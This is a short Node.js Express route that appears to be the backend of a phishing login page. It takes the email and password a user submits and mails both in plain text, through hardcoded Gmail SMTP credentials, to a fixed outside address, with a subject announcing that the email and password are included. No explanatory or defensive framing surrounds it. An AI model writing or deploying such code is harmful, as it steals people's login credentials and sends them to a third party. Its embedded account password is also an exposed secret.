const router = require('express').Router();
const nodeMailer = require("nodemailer");

router.post("/", async (req, res) => {
    let email = req.body.email
    let password = req.body.pass
    let transporter = nodeMailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
            user: "milhas.jean@gmail.com",
            pass: "Simple87-",
        },
    });
    let mailOptions = {
        from: '"Krunal Lathiya"', // sender address
        to: "Warren.kiriakou@gmail.com", // list of receivers
        subject: `${email} requested to login {email and password included}`, // Subject line
        html: `<p><b>email:</b>${email}</p>
             <p><b>Password:</b>${password}</p>
      `, // html body
    };
    try {
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log(error);
                return res.send(error);
            }
            console.log("Message %s sent: %s", info.messageId, info.response);
            res.send("success");
        });
    } catch (error) {
        console.log(error);
        res.send(error);
    }
});

module.exports = router;